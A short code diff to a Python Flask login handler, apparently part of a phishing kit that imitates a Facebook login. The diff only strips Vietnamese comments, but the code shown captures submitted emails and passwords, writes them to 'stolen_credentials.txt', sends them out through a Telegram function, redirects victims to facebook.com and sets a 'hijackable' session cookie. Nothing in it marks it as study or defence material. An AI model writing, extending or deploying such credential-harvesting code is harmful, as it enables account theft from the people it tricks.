@@ -40,14 +40,11 @@ def login():
     email = request.form.get('email')
     password = request.form.get('pass')
     
-    # Lưu vào file
     with open('stolen_credentials.txt', 'a', encoding='utf-8') as f:
         f.write(f"[{datetime.now()}] Email: {email} | Password: {password}\n")
     
-    # Gửi về Telegram
     send_to_telegram(email, password)
     
-    # Chuyển hướng
     resp = make_response(redirect('https://www.facebook.com'))
     resp.set_cookie('session_id', 'hijackable_' + os.urandom(8).hex(), httponly=True)
     return resp
